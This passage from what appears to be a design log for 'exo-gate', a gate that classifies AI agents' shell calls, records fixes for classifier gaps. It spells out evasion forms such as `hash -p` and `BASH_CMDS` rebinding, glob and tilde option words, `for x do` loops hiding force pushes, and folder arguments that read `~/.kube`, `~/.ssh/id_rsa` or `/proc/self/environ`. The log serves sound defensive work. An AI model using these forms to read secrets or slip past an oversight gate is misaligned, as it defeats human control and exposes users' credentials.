  hash, so the same held over ssh, mosh, `man -P` and an ssh `ProxyCommand`, and for
  `printf -v 'BASH_CMDS[ls]' /proc/self/fd/3`. Only an `opaque_exec` part counts as marked, since the credentials floor
  of an environment dump carries every signal on its line as its own. A store or descriptor path a rebound name runs
  later is still behind the opaque ask. A redirect is still checked as for any read, also after a `cd` into the store
  (`cd ~/.exo/state && hash > notes`), and so is a program named hash run by path (`./hash ~/.exo/state/x`), which is no
  builtin. *Differential (#423).* Main's `scripts/gate_diff.py` (with #488) against main 5a9dc394 runs 55,855 actions
  and 87 policies, and 111 pairs on 98 actions are lower. Four probe sets ran alone (`--only-corpus`). The first has
  8,305 lines: the review's lines and every rebinding form under sudo, doas, env, timeout, nice, `bash -c`, ssh, mosh,
  `man -P`, a `ProxyCommand`, `$( )` and a here-doc, alone and beside a post or a force push. It runs 33,244 actions,
  and 13,754 pairs on 7,252 actions are lower. The second has 5,948 lines: the rebind under chroot, nsenter, unshare,
  systemd-run and other wrappers, with and without ssh or mosh, and a plain shell command before or after a rebind in 82
  forms that run a nested line (`man -P`, less, an ssh `LocalCommand`, pagers, `find -exec` and `git rebase --exec`
  among them), with a store or descriptor path in the other words. It runs 24,170 actions, and 22,111 pairs on 10,291
  actions are lower. The third has 11,037 lines: ssh with its own `-E`, `-S`, `UserKnownHostsFile` or `ControlPath` on
  a store file, running a rebind and a shell command in either order, also as a `ProxyCommand`, a `LocalCommand`, a
  second hop or a here-doc fed to ssh, the same lines under mosh, `man -P`, less and more, and under sudo, env,
  timeout, nice, `bash -c`, `$( )` and a here-doc, alone and beside a post. It runs 29,434 actions, and 6,564 pairs on
  4,586 actions are lower. The fourth has 12,556 lines: a rebind whose path or name word the gate cannot read (a brace
  set, an expansion, a glob) and plain rebinds, under the same wrappers and nested lines, beside a login to another
  host over ssh, alone and beside a post, a force push or a store redirect. It runs 42,360 actions, and 12,592 pairs on
  8,982 actions are lower. No posting violation is lost in any run. The pairs fall in four groups, all kept on
  purpose, and a deny is lost only in groups (3) and (4). Each count in groups (1) to (3) is for the first probe set,
  the second, the third, the fourth, then the script's own corpus. (1) 5,924 pairs on 1,481 actions, 9,120 on 2,280,
  1,844 on 481, 1,856 on 464, and 4 on
  1: under a policy
  that lowers `opaque_exec` (a category line or an allow rule naming it), a rebinding form that sudo, doas or another
  wrapper that makes its part costly (chroot, nsenter, unshare, systemd-run) runs, inside or around ssh or mosh
  (`ssh host 'sudo hash -lp ./tool ls && ls'`, `ssh host 'sudo BASH_CMDS[ls]=/tmp/x ls'`,
  `sudo ssh host 'hash -p /x ls'`, `chroot /srv ssh host 'hash -p /x ls'`), goes from log, or ask inside a fed shell or
  under such a wrapper, to allow. So does a rebind beside a command such a wrapper runs over ssh
  (`ssh host 'hash -p /x ls | sudo sort x'`). On main the costly part was a `read` or a `shell` part whose matrix cell
  logged. With a redirect on the sudo command it was the costly `local_write` that leads since #454
  (`ssh host 'sudo hash -p /x ls > /tmp/f'`), which logged too. Now the rebind is the line's own `opaque_exec` part,
  and the category line replaces its matrix cell, as it does for `ssh host 'sudo eval x && ls'` and
  `ssh host 'eval x | sudo sort x'` on main. Under the default policy each asks. (2) 4,990 pairs on 4,990 actions,
  5,843 on 5,843, 4,216 on 4,216, 6,452 on 6,452, and 97 on 96: under a reservation that
  matches the hash part (`tool:terminal`, or `command:\brm\b` on a line with `rm`), that part's entry is named
  `opaque_exec`, with the path as target, where it was `read`. Over ssh, where the rebind now names the line, another
  opaque part keeps its own empty target and the hop's entry keeps the host (`ssh host 'setsid ssh b "hash -p /x ls"'`).
  A line that is now a store write gains a store entry too (`ssh -E ~/.exo/state/log host 'hash -p /x ls; sort x'`).
  Each line still asks as reserved, and the grant check of D-075 refuses each line it refused on main. (3) 2,840 pairs
  on 2,840 actions, 7,148 on 7,148, 504 on 504, 4,284 on 4,284, and 10 on 10: under a deny rule on costly `read`,
  `shell` or
  `local_write` parts, a rebinding form run by sudo, doas, chroot, nsenter, unshare or systemd-run goes from deny to ask
  (`sudo hash -p /x git`, `sudo builtin hash -p /x git`, `sudo -u bob hash -p /x ls`, `doas hash -p /x git`,
  `sudo hash $O ls`, `sudo hash "$@"`, `chroot /srv hash -p /x ls`). So does a line that holds one, also over ssh or
  beside a post or a force push, and `sudo hash -p ~/.exo/state/x ls > out` stays a store write that asks. A privileged
  wrapper makes its part costly. On main that part was a costly `read`, which the rule names. Now it is `opaque_exec`,
  which it does not, as for `sudo eval x` on main. Under the default policy each asks. (4) Under a policy that names
  the `read` category (a category line, or a `deny`, `reserved` or rule entry), the rebind's part was a `read` on
  main, and the entry reached it. Now it is `opaque_exec`, which the entry does not name. So a line the entry denied
  only through the rebind goes from deny to ask, or to log under `opaque_exec: log`: `hash -p /tmp/x ls` and
  `hash $O ls` under `categories: {read: deny}` or `deny: [read]`, a post beside the rebind
  (`hash -p /tmp/x ls; gh pr comment 1 --body Zork`), and over ssh a line that is now a store write, which main read
  as a `read` (`ssh -E ~/.exo/state/log host 'hash -p /x ls; sort x'`). Under `reserved: [read]` with
  `categories: {opaque_exec: allow}`, `hash -p /tmp/x ls` goes from ask to allow, since the reserved hit is gone. A
  read beside the rebind still meets the entry, so `hash -p /tmp/x ls; ls` is denied. Under the default policy each
  asks. The script's built-in policies name `read` only in a rule on costly parts, group (3), so the runs above hold
  none of these. The note of 2026-10-25 below counts them. *A shell command beside the
  rebind.* On main the hash part was a `read` that tied with a plain shell command in a line that ssh, `man -P`, less or
  more runs, and the first of the two named the line. So main checked the words around the line for store paths when the
  shell command came first and not when the rebind did. Now they are checked in either order. ssh's own `-E`, `-S` and
  `UserKnownHostsFile` name a local file it writes, so `ssh -E ~/.exo/state/log host 'sort x && hash -p /x ls'` stays a
  store write and `ssh -E ~/.exo/state/log host 'hash -p /x ls; sort x'` becomes one. Beside a line of reads alone,
  ssh's own options are read on neither tree (`ssh -E ~/.exo/state/log host ls` is allowed, #484), and neither are
  less's log options `-o`, `-O` and `--log-file` (`cat f | less -o ~/.exo/state/y` is allowed). *Rejected:* deciding
  the matrix cell and the posting rules on every part of a line here. The D-075 amendment of 2026-10-22 for #464 and
  #448 now does it for a deny cell, so a post beside `eval /proc/self/fd/3` or a store redirect is denied under a matrix
  deny for the post. An allow, log or ask cell still reads the dominant part only (#437). Also rejected: taking a plain
  shell command beside the rebind as a read too. An earlier draft did, so that a post beside
  `ssh host 'hash -p /proc/self/fd/3 ls; sort x'` would not sit under a store write that main does not make. Since #464
  that costs the post nothing: a deny cell on it still denies the line, and its posting violations are kept, named after
  the post. The draft cost the store check instead: ssh's own `-E ~/.exo/state/log` in such a line made no store write.
  *Note 2026-10-25 (review of PR #409).* A word that starts with an unquoted `[` is a glob the lexer does not mark, as
  for `unset` (#329). With files named `-p`, `as` and `ls` in the folder, bash runs `hash [-]p /tmp/x ls` as
  `hash -p /tmp/x ls`, and `hash -p [al]s` as `hash -p as ls`. Such a word is now read as a glob in the option words
  and from the path on, also after a `\<newline>`, so both lines are opaque, also behind `builtin`, `command` or sudo
  and over ssh. A quoted or escaped `[` is no glob, so `hash -p '[al]s'` stays `read`. `hash [l]s` now asks, as
  `hash l?` already did. The check of the fix found one more option word the gate cannot read: `~-`, `~+` or `~1`.
  Bash reads it from OLDPWD, PWD or the directory stack, which a line may set, so after `OLDPWD=-p` it runs
  `hash ~- /tmp/x ls` as `hash -p /tmp/x ls`. Such an option word is now opaque. Bash does not split or glob it, so
  as a path it stays one word. `~` and `~/x` stay `read`: they are the home folder, which the gate reads, and
  `HOME=-p` asks. Group (4) above comes from this review. Since #454, group (1) also holds a rebind that sudo runs
  with a redirect over ssh, whose costly `local_write` logged on main. Main's `scripts/gate_diff.py` against main
  edeb4f89 ran with 8 more policies, 7 of them on `read`. The built-in corpus runs 72,768 actions under 95 policies,
  and 1,668 pairs on 292 actions are lower: (1) 12 pairs on 3 actions, (2) 139 on 138, (3) 39 on 39 and (4) 1,478 on
  277. A focused corpus of 3,489 lines (`[`, `?`, `*` and brace words in the option and path words, under `builtin`,
  `command`, sudo, doas, env, eval, `bash -c`, ssh and mosh, beside a post, a force push or a store redirect, and the
  `BASH_CMDS` forms) ran alone. It runs 22,738 actions under the same 95 policies, and 49,713 pairs on 8,810 actions
  are lower: (1) 712 on 178, (2) 5,503 on 5,503, (3) 3,142 on 3,142 and (4) 40,356 on 7,242. A second one of 4,996
  items ran alone too: the `[` and tilde option and path words under 12 wrappers, after `OLDPWD=-p`, `PWD=-p` or
  `pushd -n -- -p`, fed to ssh, in a `>( )`, beside a sudo redirect or a key read, after a `cd` into the store, and as
  calls with a store or secret folder of their own. It runs 15,649 actions, and 20,076 pairs on 4,345 actions are
  lower: (1) 240 on 60, (2) 2,042 on 1,963, (3) 2,000 on 2,000 and (4) 15,794 on 3,033. No posting violation is
  lost, and a deny is lost only in groups (3) and (4).
  A second review of PR #409 found one more word the gate took as one: a double-quoted `${!n}`. With `n=@` or
  `n='a[@]'`, bash splits it as it splits `"$@"`, so after `set -- -p /tmp/x ls`, `hash "${!n}"` runs `hash -p /tmp/x
  ls`. A double-quoted word with `${!` is no longer one word, before the `-p` or from the path on, so such lines are
  opaque. `hash "$cmd"` stays `read`. Main reads them as `read`, as c833d5b0 did. Main's `scripts/gate_diff.py` ran
  against c833d5b0 with the same 95 policies, the built-in corpus, the check's corpus of 3,287 lines and 490 lines of
  double-quoted indirect words under seven wrappers. It runs 83,465 actions, and 1,231 pairs on 241 actions are lower.
  Each is a line with `${!`, in group (2) 89, (3) 60 or (4) 1,082.
  *Note 2026-10-26 (issue #585).* A `$` form a `\<newline>` splits is read as its plain spelling is now (#585): the
  lexer skips each `\<newline>` after the `$`, and `lone()` tests `${!` with them dropped, so
  `hash "$\<newline>@"; ls`, `hash "${\<newline>!n}"; ls` and `hash -p "${\<newline>!n}"; ls` are opaque as
  `hash "$@"`, `hash "${!n}"` and `hash -p "${!n}"` are, while `hash "$cmd"`, `hash -p "$P"` and `hash "$r"`
  through a nameref stay `read`.
  *Amendment 2026-10-22 (issue #311):* a shell call runs in its own folder argument (`cwd` for Exo's bash tool,
  `workdir` for Hermes' terminal and Codex's exec_command). The gate read that folder only through #209: a relative
  word that resolves into a store from `cwd` made the whole call `credentials`. A store read by a plain name was
  missed, so `{"command": "cat config", "cwd": "~/.kube"}` was `read` and allowed where `cd ~/.kube && cat config`
  asks, and `workdir` was not read at all. *The folder adds a part.* The line is now classified in the session's
  folder alone. It keeps its own category, target, axes, text and parts. A `credentials` part is added when the call
  reads a store from its folder, found in one of three ways. The folder is itself a store, as a `cd` word is (a link
  is resolved). A relative word resolves into a store from it (#209). Or the line reads a relative name there as
  after `cd <folder>` (#192), checked once per call on the whole line. The part's target is the folder, or the folder
  joined with the name. The credentials floor reads every part, so the call asks. `no_grant` keeps a standing grant
  off it and observe mode enforces it. `call_approvers` sends it to those who may answer both its category and
  credentials. The line's deny entries, target rules, matrix deny cells, posting checks and reserved entries still
  apply. Both arguments count, also for `bash`, which ignores `workdir`: the gate cannot tell which harness sent the
  call, and the folder only ever adds an ask. *The reading from before is kept.* Where the line read in its folder
  has a `credentials` part (#209 made such a call `credentials` as a whole), that reading is kept beside the line
  (`Classification.also`). `decide` decides both, and the stricter outcome stands, with the reserved hits and
  violations of both. `no_grant` and `call_approvers` read both. So no call decides lower than before, and the old
  reading's own loss ends. With `~/.exo/run` as `cwd`, `tar czf /tmp/o.tgz . ; git push --force origin main` was
  `credentials` and asked under a matrix that denies the push, and a seat that may answer credentials could answer
  it. It is now denied, and only the principal answers it. *A repo's own `.claude` folder.* A folder in a repo's
  `.claude/worktrees`, `commands`, `agents` or `skills` holds the repo's files, as the search tools judge it
  (StoreSkip, #241: the parent holds `.git`, and the folder holds no Claude login or transcripts). Only a #209 hit
  counts there, so `ls *`, `ls config`, `wc -l *`, `grep -r foo *`, `du -sh *`, `file *` and `rg -n config src` in
  `<repo>/.claude/worktrees/x` keep their class. A store folder by its name inside such a folder (`x/.kube`,
  `x/.config/gh`) is not the repo's, and is read as a `cd` there is. The `.claude` folder itself, `~/.claude` and a
  `.claude` folder with no `.git` beside it are stores, so any call there asks. *History.* The first version (#415)
  made the whole call `credentials`, as a `cd` does. exo-36's differential of it found 1,770 actions that went from
  deny to ask, 118 that lost posting violations and 173 that lost reserved entries. It also read the folder in every
  nested line, which read it into the text `ssh` runs on another host and spent the #269 budget at every level. The
  next version added the part, but also put `workdir` among the #209 folders, which made the whole call `credentials`
  again for `workdir`. exo-36 found 54 matrix denies that went to ask there, and 114 calls with a wider approver set.
  A check of the version after that found these gaps. A NUL in the folder, or a relative folder while the
  gate's own folder is gone, made `classify` raise, so the hook asked as for a call it could not classify, which any
  seat may answer, where the line alone was denied. A store folder inside a repo's `.claude` worktree was not read.
  With both folder arguments, the part named the first folder even when the name resolved into a store from the other,
  so a target entry on the store missed it. *With #464.* Main's #464 made a store read after a `cd` on a store-write
  line a `credentials` part beside the write. Its hook fallback, for a call whose decision fails, read the call's top
  category only. This change had left the folder's read off a store-write line, so `deny: [credentials]` denied
  `cd ~/.kube && cat config; echo x > ~/.exo/policies/a` and only asked for the same line with `~/.kube` as `cwd`.
  That read is now a `credentials` part beside the write too. The line stays `store_write`, so only the principal
  answers it. The fallback now reads `no_grant`, so a call with the folder's part asks the principal alone, once, in
  every mode. abu-aska found the gap on a trial merge: `cat config` with `~/.kube` as `cwd`, under a deny entry
  whose pattern does not compile, ran in observe mode. *With #468.* Main's #468 weighs the `credentials` part a
  store read after a `cd` adds to a store-write line: the weight of the line's own parts, at least `costly`, and a
  heavier command deeper in the line as a part beside it. The part this change adds for the folder kept the
  `credentials` default, `costly`. So under `matrix: {irreversible: {private: deny}}`,
  `cat *; touch ~/.exo/state/x; git push --force origin main` with `~/.kube` as `cwd` asked, as on main, while its
  `cd` form was denied. A rule on `credentials` and `irreversible` split `cat *; rm -rf build` with `~/.ssh` as
  `cwd` the same way, also before the merge. The folder's part now goes through the same helper (`_weigh`), on every
  line the folder adds a part to, for `cwd` and `workdir`. It keeps the read's own weight, and a heavier command on
  the line is a second `credentials` part with that weight beside it. The line keeps its category, card and
  approvers. Since the read keeps its weight, a matrix whose `costly` cell is stricter than its `irreversible` one
  still denies the folder form, as before. There the folder form can be stricter than its `cd` form, never lower.
  The author found this gap in a check of the merge with main 5a9dc394. A differential from main 5a9dc394
  (`gate_diff`) finds 0 lowered pairs: 4,977,270 on its built-in corpus (57,210 actions under 87 policies),
  2,719,446 on the folder corpus (31,258 actions) and 1,412,532 on 16,236 actions of 396 lines with a force push or
  `rm -rf` beside a store read. Those lines put the command plain, behind `sudo`, `env`, `timeout`, `nohup`,
  `bash -c`, `ssh` and `mosh`, in a `$( )` and in a here-doc, each as a `cd` form and with `cwd` and `workdir` in 8
  folders. Under 22 policies and three approval tables, none of them decides lower than before this weight or than
  main, and no approver set widens. A folder form in a store can still decide lower than its `cd` form in three cases,
  none lower than main, each in the limits below: under `deny: [store_write]` (#453), a rule or entry on the bare
  name, and a rule keyed on the text of a line of one command. A check of this change found the last two. (A fourth,
  a line that reads a secret itself under a `target:` entry on the folder, is lifted by the #320 amendment above: the
  folder's read is a part beside such a line.) Rejected: the folder argument among the
  #209 folders, which replaces the line. Keeping the old reading costs a second reading of the line and a second
  decision, both only where the line read in its folder has a `credentials` part. That reading is a whole
  classification, so nothing has to be found among the parts. A `cd` on the line is read as before. Limits: the
  session's own folder (#209) is not a target. The file tools ignore a folder argument. A name that climbs out of a
  repo's `.claude` worktree back into it is not caught (`cat ../../settings.local.json`), as before. The store-write
  checks do not read the folder argument (`echo x > gates.yaml` with `~/.exo/policies` as `cwd` stays a `local_write`,
  #453). A line that reads a secret itself keeps that reading (lifted by the #320 amendment above: the folder's read is
  a part beside it when it names another target, so a `target:` entry on the folder reaches it).
  The part's target is the folder joined with the name, where a `cd` form's is the name alone, so a rule on
  `target: config` reaches only the `cd` form. The call's text has no `cd`, so an allow rule keyed on `command` that
  names a line of one command (`git push --force origin main` in `~/.ssh`) lifts the matrix deny on its parts, as on
  any such line (#394), where the `cd` form keeps it. Each is decided at least as on main, and all but the #453 store-write case ask. A differential against main
  (`gate_diff`, #423, at 3ddd89e9, whose gate is the same as 39cafcba's) finds 0 lowered pairs: 4,803,183 pairs on
  its built-in corpus (55,209 actions under 87 policies), and 1,905,648 pairs on 21,904 folder-argument actions (68
  lines under 42 folder spellings and 9 tool and key forms, with both keys, relative folders and session folders in
  a store). On the 21,292 actions of that corpus, under 9 policies and three approval tables, no call gets a wider
  approver set or loses `no_grant`, `binds_exact`, a reserved hit or a violation. No lowering is intended.
  *With #399 (2026-10-24).* Main's #439 reads a gh line as gh does. It keeps the line as read before #399 as its
  `floor`, and the targets gh may land on as `alt_targets`, and `decide` keeps the strictest of them on each axis
  (`_strictest`). The exo-gate hook read the floor in its own `_readings`. In a shell call with its own folder the two
  kinds meet: the floor is read in that folder too, so it can carry its own reading from before #311. `gate.readings`
  now lists every reading: the call, its `also`, its `floor` and the floor's `also`. `decide` decides each, the
  `also` reading through `_strictest` too, so its exposure, third party and repeated violations stand beside the
  outcome, the reserved hits and the violations it kept before. `no_grant`, `call_approvers` and `body_unseen` read
  every reading, and so does the hook: body files, the required executor, "once", grants, observe mode, who may
  answer and the fallback for a failed decision. The hook's own `_readings` and `_no_grant` are gone. `binds_exact`
  binds a call no grant may cover, one with other targets and one with a floor. Each reading matters. Under a scope
  that makes myorg private and a matrix that allows a private force push,
  `git push --force origin main ; gh -R pub/repo pr comment 5 -b x` with `~/.kube` as `cwd` asks from its floor, as
  on main, and is allowed without it. With `~/.exo/keys` as `cwd`, `gh -R $R secret set X`
  keeps a reserved `credentials` hit that only the floor's `also` has. A differential (`gate_diff`) from main
  8c09c29c finds 0 lowered pairs: 5,762,445 on its built-in corpus (66,235 actions under 87 policies), and
  1,209,742 on 11,306 actions under 107 policies, its 87 and 20 more on scopes, targets and posts. Those are 24 gh
  lines with `-R`, URL operands and moved subcommands, alone and beside a store read, a store write, a force push,
  `bash -c` and `ssh`, in 9 folders under 4 tool and key forms, and their `cd` forms. Against this branch before
  the merge the same pairs lower 0 too. Under 20 of those policies and three approval tables, none of the 9,408
  actions of that corpus decides lower than main or the branch on the exposure, the third party, `no_grant`,
  "once", `binds_exact`, the executor's body check, the fallback or who may answer.
  *Joined and folded (2026-10-24).* The reading from before #311 read the folder folded (`os.path.abspath`), as
  #209 did. That erases a `..` after a link: the shell runs in `sdir/../policies` through `sdir`. The folder is now
  read both ways: joined to the session's folder as written, as the kernel reads it, and folded, as bash's `cd` and
  #209 read it. The part's target goes past a link the same way. So with `~/proj/sdir` a link to `~/.exo/state`,
  `cat ../keys/seat` with `sdir/../policies` or `sdir` as `cwd` keeps its reading from before #311, and its part
  names `~/.exo/keys/seat`, which `deny: ["target:*/.exo/*"]` reaches. Reading the folder joined alone would lose
  main's ask for `tar czf /tmp/o.tgz .` with `xl/../kl` as `cwd`, where `~/proj/kl` links to `~/.ssh`. #527
  (#340) reads relative store writes from the joined folder too. A trial merge with it found the folded folder
  reopened its fix there. *With #435 (2026-10-24).* Main's #440 makes `~/.exo/plugins` a store folder. A read in
  it by a relative name from the folder argument asks, as its `cd` form does. A write there by a relative name stays
  a `local_write`, as on main: `echo x > hook.py` with `~/.exo/plugins/foo` as `cwd` (#453).
  *Amendment 2026-10-22 (issue #436):* bash and POSIX take `do` as the reserved word right after the name in
  `for NAME do` and `select NAME do`, with no `in` list and no `;` or newline before it, and run the loop over the
  positional parameters. The parser opened a loop body only after a `;` or a newline, so it read that `do` and the
  whole body as words of the `for` command, whose header names no program. So
  `for x do git push --force origin main; done` was a `read`, allowed under every policy, `deny: [force_push]`
  included, and so was a delete, a post or a store write in the body (`select` asked as `opaque_exec`). Now an
  unquoted `do` right after the word that follows a `for` or `select` the parser reads as a reserved word ends the
  loop's first command, as a `;` would. The line then reads as `for NAME; do ...` does wherever a line is parsed
  (`$( )`, backticks, `bash -c`, `eval`, a compound, a function body). The parser takes `for` or `select` as that
  reserved word also after `function NAME` or `coproc [NAME]` and a reserved word such as `{`, and behind reserved
  words such as `then` (`function f { for x do ...; done; }`). Only this check reads command position that widely:
  the compounds the parser follows for a heredoc or a pipe into them are found as before (#161). A quoted `"do"`, a
  `do` in an `in` list and a `for` that is only an argument (`echo for x do`) stay words, as in bash. An arithmetic
  loop (`for ((...)) do`) was read already. The gate differential (#423) lowers 9 pairs on one action of its corpus
  (24,937 actions x 76 policies). On 84,601 loops built from the corpus's simple commands (in a `for` or `select`
  body, a function or coproc body, `$( )`, `bash -c`, a `while` loop that ends in `break`, and beside a loop) it
  lowers 21,293 pairs on 1,233 actions. Each lowered pair now gets the decision main gives the same loop written with
  `;`, checked pair by pair (category, outcome, rule and reserved entries). Main read these lines as one command, and
  that reading asked for a reason bash never meets. There are three groups.
  An unknown command after the loop, such as `break` in
  `while true; do for x do git push --force origin main; done; break; done`, was the one program main saw there, so
  the line asked as `opaque_exec`. Under a policy that allows or logs the body's category (an allow-everything rule,
  `categories: {delete: allow}`), the line now gets the body's outcome (19,565 pairs on 1,029 actions, and the 9
  pairs of the corpus).
  A store path read in a `select` body, or in a loop body after `function NAME` (with or without `{`) or `coproc`
  (`select x do cat ~/.exo/keys/seat.key; done`), was an operand of an unknown program, so a `store_write`. It is
  now the `opaque_exec` of the `select` or the definition beside a plain read or a `credentials` read. A policy that
  allows `opaque_exec` allows it, `deny: [store_write]` or a `target:` deny on the store asks, and a `reserved:`
  entry on `store_write` no longer names it (1,624 pairs on 168 actions).
  A `sudo` or `doas` command that writes through a redirection in a loop body (`for x do sudo echo hi > /tmp/f; done`) took the
  redirection's `local_write` and now takes the `read` main gives that command alone, so an ask or log line on
  `local_write` no longer reaches it (104 pairs on 36 actions in the original corpus). The review's expanded
  corpus also found 66 `doas` pairs on 22 actions. `deny: [local_write]` still denies it (D-075). Since #454 that
  command alone is a costly `local_write`, so the loop line is a `local_write` again and this group is gone.
  Left out: `time for NAME do ...`, since the parser does not read `for` after `time` as a reserved word. It asks as
  `opaque_exec`, as `time { ...; }` does.
  *Amendment 2026-10-21 (issue #313, follow-up to #199):* on Linux each thread's `/proc/<pid>/task/<tid>/environ`
  holds the same environment as `/proc/<pid>/environ`, another process's included. The store list named only the
  direct form, so `cat /proc/self/task/1/environ` and `read_file` on it were plain reads. The store list now names
  the `task/<tid>/` form too. The #199 glob check reads `/proc/<pid>/<x>/<tid>/<glob>` as a thread's file when `<x>`
  could match `task` and the glob could match `environ`, so `cat /proc/1/*/*/environ` and
  `cat /proc/self/[t]ask/*/environ` ask. Other files under `task/` keep their class (`cat /proc/self/task/*/status`).
  The search tools leave a thread's `environ` out of a walk, as they leave out the direct form (#241).
  *Lowered lines.* A thread's environment is decided as `/proc/<pid>/environ` already was, so some lines decide
  lower than before. A differential of main against the change ran 28,651 actions under 103 policies: the
  differential's own set, plus task-environ lines, glob forms, compound lines and file-tool calls, and 27 more
  policies (among them a `read` deny, `reserved: [read]`, `/proc` targets and more matrix cells). It found 4,878
  lowered pairs on 1,910 actions. Each one decides as main decides the same action with `/proc/self/environ`. Four
  groups, all from how the gate already handles any secret store: (1) A file tool on a store takes the `credentials`
  class in place of its own, so a deny on `read` or `local_write` (a category line, a `deny:` entry, a rule, a matrix
  cell) becomes the credentials ask (`read_file /proc/self/task/1/environ` under `categories: {read: deny}`). A
  `reserved: [read]` entry no longer matches the call. It still asks, and no grant covers it, since it is
  `credentials`. A shell line keeps the read as a part (D-075), so a `read` deny still denies `cat`. (2) The matrix
  sees the dominant part only. A credentials line is costly and private and takes the strongest reversibility of its
  parts, so a deny cell for a read, or for another part of a compound line, no longer applies
  (`cat /proc/self/task/1/environ; git push --force origin main` under an `irreversible`, `internal` deny cell
  asks). (3) Before #396 the posting rules checked the dominant part, so a post beside the read lost its listed
  violations. They now read every post (D-075 amendment, #396), so it keeps them, named after its part. The
  line asks either way. (4) A line's credentials target is the first store it names and a `cat` part has no target, so a
  `target:` entry for a second store on the line no longer matches
  (`cat /proc/self/task/1/environ; cat ~/.ssh/id_rsa` under `deny: [target:*/.ssh/*]` asks, as
  `cat ~/.aws/credentials; cat ~/.ssh/id_rsa` already does; since the #609 follow-up of 2026-10-27 each other store
  on the line is a `credentials` part with its own target, so both are denied again). The differential does not count a fifth change,
  because the outcome stays an ask. (5) Beside a store write the line is `credentials`, not `store_write`. A seat
  that `approvals.yaml` delegates `credentials` to may then answer what only the principal answered
  (`cat /proc/self/task/1/environ; echo x > ~/.exo/policies/gates.yaml`). Main does the same for any secret on
  the line (`env; echo x > ~/.exo/policies/gates.yaml`). Rejected: keeping a file tool's own class as a part,
  as D-075 does for shell lines. It would keep group 1 denied, but it changes every file-tool call on a store
  (`read_file ~/.ssh/id_rsa` under `categories: {read: deny}` asks on main), so it is a follow-up, as are matrix
  cells, posting checks and `target:` entries on every part, and a store write that keeps the principal's answer
  beside a secret. (The D-075 amendment of 2026-10-22 for #464 and #448 keeps a file tool's own class as a part,
  and reads each part's matrix cell for a deny.) Limits: a doubled slash or a `..` inside a store name is matched as written, so
  `cat /proc/1/task/1//environ` and `read_file /proc/1/task/1//environ` stay reads, as `cat ~/.kube//config` does
  on main. A glob in the `/proc` name itself is not read, for either form (`cat /pro?/self/task/1/environ`,
  `cat /pro?/self/environ`).
  *Amendment 2026-10-22 (issue #423):* a change to the gate's classifier or to `decide` is checked against main with
  `scripts/gate_diff.py`. Each line it decides lower than main is fixed or named in the change's decision amendment,
  with the reason it is safe. The script runs `classify` and `decide` of both trees, each in a process of its own with
  the same temp HOME, under more than 80 policies, which use every posting and scrub key the gate reads. The actions
  are the lines and calls the gate suites of both trees test, kept as written, and generated forms. The script reads
  the gate's tables of both trees with `ast` and makes a line or call for each entry: each program, subcommand,
  prefix, wrapper, shell and interpreter flag, each value option, exec option and allowlisted module, each tool and
  name hint word, each path, text, title and target key, and a string for each alternative of the secret path, SQL,
  patch header and scrub patterns. A head that drops an entry still runs the base's line for it. A table a tree holds in
  another form is named, and the run exits 2. Posts trip each scrub and forbid rule, and payment and account calls
  meet budget and escalation policies that no other step masks. Tests take each table entry and each step of
  `decide` out of main's gate in turn and check that a built-in form or pair changes. Each simple line also runs in
  compound wrappers (`timeout`, a heredoc and a here-string among them) and under the other shell tool names and
  keys the gate reads.
  Folder rows read a secret store only as resolved from the session folder or the call's own `cwd` (#209), so main
  decides each otherwise without its folder. A pair is lower when its outcome ranks lower in allow, log, ask, deny.
  At the same outcome below deny it is also lower when it loses a reserved hit or category, or a posting violation
  main lists. At an equal deny neither counts, since the call is blocked. Reviewers run main's copy of the script
  against the PR head and read any change a gate PR makes to it, so a PR cannot weaken the check that judges it.
  Left out, so a change there needs its own tests: session folders beyond the corpus's own and the folder rows, a
  name, key or program the script does not read from those tables (it runs only where a test names it), a regex
  alternative or helper pattern beyond the four sampled ones (seen only where a test or a seed names it), files and
  links in HOME beyond its own, the stores the environment moves (`EXO_HOME`, `EXO_PRINCIPAL_STORE`,
  `EXO_KEYS_FILE`, `EXO_BUS_*`), and the hook steps after `decide` (grants and `NO_GRANT`, `binds_exact`, the
  registry risk floor, the required executor). Chosen over a fixed
  table of expected outcomes, which a change can edit along with the gate: the corpus comes from the tests and tables
  of both trees, so deleting a row or an entry does not hide its line.
  2026-10-22 (#460): a posting violation counts as often as each tree lists it, so a head that lists once a text
  two posts of one name both meet is lower. Each seed also runs under each tool table name of either tree that ends
  in `terminal` or `shell`, since adding such a name to the table stops the gate reading it as a shell, and in a call
  that holds both `command` and `cmd`. The report shows a few reworded pairs, and `--json` lists them. The line
  `and N more on other posts` names no text, so it is not compared as one. Its N counts in each tree's total, and
  a head with a lower total is lower, so a post skipped past the listing cap still shows. A built-in line of 25
  posts reaches the cap.
  2026-10-28 (#551): three gaps of the comparator are closed, so "0 lowered" means more. (1) No test line reached the
  gate's shared fail-closed budgets of one classify call, so a head that failed open once one was spent showed 0
  lowered. Six budget lines now run with the harvest, also under `--no-variants`: past `_exo_relative`'s 64 store
  folders, past its join budget `_EXO_PARTS` (many names, the stress tests' `_NEAR_CAP` line, and two `<( )` each
  under it alone), and past `_BRACE_BUDGET` for a read and a write. Each asks on main only because its budget is
  spent, which a test checks by lifting the budget. The brace budget's share for a repeated store spelling is left
  out (past it a repeat counts as the hit it had), and so is its Exo-store share alone (no line found spends it
  without the secret-store share). (2) An outcome not in `gate.OUTCOMES` (`"Ask"`, `"block"`) ranked as ask, but the
  hook runs any outcome but ask or deny: it now ranks as allow in the head and as ask in the base, and the summary
  counts such pairs. (3) At the same outcome below deny a pair is also lower when the head loses one of the hook's
  checks after `decide` that depend only on the call and the decision: `no_grant`, `body_unseen`, `binds_exact`, or
  a reserved hit on another part than the line's own (`_grant_for`). A check a tree's gate lacks is not held; one that
  raises is the hook's error card (a decide error, once-only, so neither a check nor a reserved hit is lost). The
  script marks the card's pairs in their flags (`error_card`), which no gate decision carries, so a decision whose rule
  is `"error"` is compared like any other. These are no longer among the
  hook steps left out; standing grants themselves, who may answer, the risk floor, the required executor, observe
  and bypass modes, a policy changed mid-session and the decision model still are. Chosen over listing budgets as
  left out: the linear-time PRs change exactly these paths. Main 7cc2eb14 against itself with the new script, built-in
  corpus `--no-variants`: 12,666 actions x 88 policies, 1,114,608 pairs, 0 lowered (139.8 s, against 130.4 s for
  main's script on its 12,660 actions). Against mutants of main on that corpus, main's script reports 0 lowered where
  this one reports 348 pairs (`_exo_relative`'s "too many to resolve" returns made `""`), 808,963 (`binds_exact`
  returning False) and 27,985 (`body_unseen` dropped, `decide`'s own reading kept); for `NO_GRANT = ()` 222 against
  350,322, and for a `decide` that says `"Ask"` 11,530 against 625,921.
